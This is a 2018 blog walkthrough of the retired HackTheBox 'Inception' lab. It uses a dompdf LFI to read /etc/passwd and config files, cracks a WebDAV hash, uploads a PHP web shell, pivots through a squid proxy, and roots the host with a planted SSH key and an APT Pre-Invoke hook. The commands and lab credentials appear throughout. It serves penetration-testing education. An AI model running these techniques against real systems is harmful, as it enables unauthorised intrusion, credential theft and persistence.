<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Inception Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-inception-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-05-01T16:21:35+00:00">May 1, 2018</time><time class="updated" datetime="2025-06-10T20:26:00+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another challenge “<strong>Inception</strong>” which is categories as retired lab presented by <strong>Hack the Box</strong> for making online penetration practices. Solving challenges in this lab is not that much easy, you have to use your entire Penetration testing skills. Let start and learn how to breach a network and then exploit it for retrieving desired information.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Hard</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<p><span style="color: #000000;">Since these labs are online accessible therefore they have static IP. The IP of Inception is <strong>10.10.10.67</strong> so let’s start with nmap port enumeration.</span></p>
<pre class="lang:default decode:true">nmap -A 10.10.10.67</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 80 and 3128 are open in the victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nJqLJNpb6QY/WuiKM7ogTCI/AAAAAAAAWng/Uz03m3C8FYw--1EultPsyWuS0XFjWsaOgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing port 80 was open on the victim’s network we preferred to explore his IP in the browser and the following image get opened as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-a6_aeXxGPO0/WuiKPZAZT6I/AAAAAAAAWoE/n0AEJpqjKokY3tvLAW3uVH1TYmv8OsK8ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then we checked its source code and found something “<strong>dompdf</strong>” which could be a directory, so let’s go through it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Jg0Dj1NWPHg/WuiKRrawsyI/AAAAAAAAWoo/HDOjrwD9I8csvLLDMSDrYK53SZAQsiJGwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So when we had explored /dompdf in the browser, it put up some files. I was interested in version so we opened it and found <strong>version 0.6.0</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EQq0inlNDyk/WuiKTTPqYVI/AAAAAAAAWpA/vpmv4r03PrI6OoMWn56C49ud4HZBhIkZACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">After that with help of searchsploit, we got an exploit <strong>33004.txt</strong> for dompdf 0.6.0.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-74CM5upSPNk/WuiKTdlReFI/AAAAAAAAWpE/96PeXjp6LFkCYWCD2eWGmxOJtnj3_b-5ACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">In this exploit, you will get an instance for exploiting the target machine with help of LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-atT2BMetbl0/WuiKUNdrdaI/AAAAAAAAWpM/NYZ83jDnpIEbckdlUHHXdHEM4-9yJRNDwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then without wasting time we look for <strong>/etc/passwd</strong> file with the help of the following command:</span></p>
<pre class="lang:default decode:true">curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd</pre>
<p><span style="color: #000000;">But we got an encoded result, therefore, we need to decode it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_ysqfE0sSaU/WuiKUHh8e5I/AAAAAAAAWpI/SzwXhE3EYVoMqvSGmml-4a22I_rs0DNcQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">From given below image you can observe that we have successfully decoded base 64 data and can read first username <strong>Cobb</strong>. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2ArMuiEvYSw/WuiKUlTg4iI/AAAAAAAAWpQ/byirHC1U1p4Tcq6_hyuXWo4NNNPWOgz9wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">And after penetrating very deep, we found <strong>default.conf</strong> file inside <strong>apache</strong> which holds another base64 value, now use given below command for that.</span></p>
<pre class="lang:default decode:true">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JWeSUI3rlVw/WuiKNctnVQI/AAAAAAAAWnk/lYkUdlMzu1MVuIAGTurBXwcit1AF-KRFgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">After decoding above found base64 value, you will get a highlighted path for AuthUserFile as shown below in the given image. If you will read the text inside location tag &lt;location&gt;, you will realize that it is giving hint for login credential for <strong>/webdev_test_inception</strong> and more security details such as authentication type: basic.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-k6a07ZAZ4o0/WuiKNlOo6YI/AAAAAAAAWno/M_8O4kDC4fkddev8aFjPl6gr5u9EXWR3wCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Again type the following command:</span></p>
<pre class="lang:default decode:true">curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd</pre>
<p><span style="color: #000000;">Hmmmmm!!! One more base64 value, let’s decode this also.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-h5TI0h7mgYw/WuiKN0AQMQI/AAAAAAAAWns/TDLRSkmEl7wwQxOnRTTlx2A8NW0DFf0HQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">So when we had decoded above based 64 value and found a hash value for user “webdav_tester” from it. Here we had copied it into a text file and now going to use John the ripper for cracking this hash.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xBpBVpafVwM/WuiKOCap4UI/AAAAAAAAWn0/594qvbNjV207jiyEqezpJ4bqE9CEhukSQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Type following command for cracking hash value with the help of /rockyou.txt</span></p>
<pre class="lang:default decode:true">john hash --wordlist=/usr/share/wordlists/rockyou.txt</pre>
<p><span style="color: #000000;">Great!! It gives “babygurl69”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ACDO4G_rx3A/WuiKOHfaX3I/AAAAAAAAWnw/wW4bipTuAvo4zh5sOOrVGL300zIVPxOkACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">So currently we have our <strong>username</strong> “webdav_tester” and the <strong>password</strong> “babygurl69” for login into / webdev_test_inception and authentication type is also basic therefore we can <strong>use cadaver</strong> for uploading backdoor.</span></p>
<p><span style="color: #000000;">Type following command for uploading php backdoor:</span></p>
<pre class="lang:default decode:true">cadaver http://10.10.10.67/webdav_test_inception
webdav_tester
babygurl69 
put /root/Desktop/qsd-php-backdoor.php</pre>
<p><span style="color: #000000;">While uploading php backdoor we had tried so many types of php backdoor but among them, qsp-php-backdoor.php was working and it is default location is /usr/share/webshells/php.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-j_vySetyTkc/WuiKOQJAajI/AAAAAAAAWn4/R1sCEiJZs8wlGNJbP9AOSnhU1zrY5K8IQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Then we open uploaded php shell in the browser and click on “go to current working directory”.</span></p>
<pre class="lang:default decode:true">http://webdav_test_inception/qsd-php-backdoor.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-494gWC89Orw/WuiKO9lxf3I/AAAAAAAAWn8/2WITRyziTEMySpGYV8uX7MN6ApWWVNjVACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">It brings us into inside /html directory, where we saw <strong>wordpress 4.8.3</strong> and opened it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-W-8sjSWq1J4/WuiKOwFdVNI/AAAAAAAAWoA/SAM4FAnGiPkkg0siwdmZRf4U72xmIR8OACLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Then we explore <strong>/wp-config.php</strong> file and found the username “root” and password “<strong>VwPddNh7xMZyDQoByQL4</strong>“. We also tried to login to WordPress but it was not active.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VqUuAgeZGkc/WuiKPlL_yWI/AAAAAAAAWoI/CUJ0n8CUW106qjwAJSoasdPqDlWkBHyDgCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Again we came back to the previous page as shown below and type the following command inside execute shell text filed for identifying all running services inside the network.</span></p>
<pre class="lang:default decode:true">netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UGLPzAPf3M4/WuiKP_kjyII/AAAAAAAAWoM/68BCFQ-LK_0zfKoFql_FfDlKhzZjphjwQCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Here we found <strong>ssh is open</strong> inside internal network and also observed new interface 192.168.0.10</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AzDpfr1p3zM/WuiKPyPwIYI/AAAAAAAAWoQ/BYeF105IoOwUnONgjqtH3HvQhj7iX-o0gCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Since we know port 3128 is open for squid HTTP proxy, so now <strong>open /etc/proxy.conf</strong> to add that inside it as shown below in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HfQgwUINITI/WuiKQIm1QRI/AAAAAAAAWoU/fQ_FBCIqEP4uYctJnYLTzDnLXwg5GczKwCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Now connect to ssh through proxychains by using below command and submit password that was found from inside /wp-config.php for user cobb.</span></p>
<pre class="lang:default decode:true">proxychains ssh cobb@127.0.0.1</pre>
<p><span style="color: #000000;">Nice!!! It works and we logged in successfully, let’s grab the user.txt first as shown.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A2y7wbsP8xg/WuiKQjJWGEI/AAAAAAAAWoY/o5kIAYTvvaMG_2WajWlZDCkCuzuW9K5QgCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Then for finding root.txt flag, we need privilege escalation, therefore, type <strong>sudo -l</strong> command which will tell you sets permission for user cobb. And you will see that Cobb has ALL permissions. Then further we execute <strong>sudo su</strong> and got root access and move for root.txt file.</span></p>
<p><span style="color: #000000;">Dammitttttttt!!!!! It was a bloody trap, not original root access.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OnzM6zplamQ/WuiKQ0Qim5I/AAAAAAAAWoc/eE1UZRZPxUQZIT65kfKrAC4f6rD89TkawCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">ifconfig tells us IP is 192.168.0.10 and then we ping thought to <strong>ping 192.168.0.1</strong>, and the host was up.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_s1Cz-GU5aY/WuiKROmP71I/AAAAAAAAWog/_L4GJzros2olNhy151aWULSXh32z-9TWwCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Then with help of the following command, we came to know port 21, 22 and 53 were opened.</span></p>
<pre class="lang:default decode:true">nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded</pre>
<p><span style="color: #000000;">We successfully login into<strong> FTP</strong> by using <strong>anonymous: anonymous</strong> and run <strong>ls command</strong> for looking all directories and files.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0EaXImdrq6o/WuiKRQMZ6FI/AAAAAAAAWok/fmdsKp5D5gMNUtDoeL9t7dJAA9fEnui1ACLcBGAs/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Inside /etc we saw three files: passwd, crontab and tftpd-hpa in /default. We downloaded all three files.</span></p>
<pre class="lang:default decode:true">cd /etc
get passwd
get crontab
cd default
get tftpd-hpa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--yTEaIKmRHs/WuiKRyJ3h4I/AAAAAAAAWos/1fFmxtSyy_M7skSIP2wos9_ewnd7A1aQQCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Then read all three file through cat</span></p>
<pre class="lang:default decode:true">cat /etc/passwd
cat /default/tftpd-hpa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-liLjN1OPSM8/WuiKSQ6kD_I/AAAAAAAAWow/fQ14WVTnijUjzqO5WjHU8WIQe5p5iw3SgCLcBGAs/s1600/31.png"/></span></p>
<pre class="lang:default decode:true">cat crontab</pre>
<p><span style="color: #000000;">Here we saw something very interested that every 5 minutes apt-update command is running.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HYa7f6iPAsY/WuiKS525qEI/AAAAAAAAWo4/Z8FbvA7UH_gLnrsURsC-eIByflQSbsrrgCLcBGAs/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Then we generated ssh key by executing the following command:</span></p>
<pre class="lang:default decode:true">ssh-keygen</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jt7osdrJkEg/WuiKSrFMI4I/AAAAAAAAWo0/mYoymdbesYsir2_ivwbCgy-w3K018c8OACLcBGAs/s1600/33.png"/></span></p>
<p><span style="color: #000000;">Now enter following commands for uploading public key on 192.168.0.1 using TFTP:</span></p>
<pre class="lang:default decode:true">cd /root/.ssh
tftp 192.168.0.1
put id_rsa.pub /root/.ssh/authorized_keys</pre>
<p><span style="color: #000000;">Since TFTP gives all permission to the authorized key which means anyone can read and write it as result ssh public key get fail due to incorrect permission, it should 600. Now exit from tftp and change authorized key permission in the current host machine.</span></p>
<pre class="lang:default decode:true ">quit</pre>
<p><span style="color: #000000;"><strong> </strong>We were not much sure how to change permission through apt-update command, therefore, we search in Google and luckily found a <span style="color: #0000ff;">link</span> that helps us in generating apt update command for changing authorized key permission.</span></p>
<pre class="lang:default decode:true ">echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' &gt; rootshell
tftp 192.168.0.1
put rootshell /etc/apt/apt.conf.d/rootshell
quit
ssh root@192.168.0.1</pre>
<p><span style="color: #000000;"><strong> </strong>Wait for 5 mins and then you will get root access. After that grab the root.txt flag and Hit the GOAL!!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qbv44xPid3M/WuiKTM4vxOI/AAAAAAAAWo8/LGPpay_K4g8KWgY25C26xJWToz6zlf2rwCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
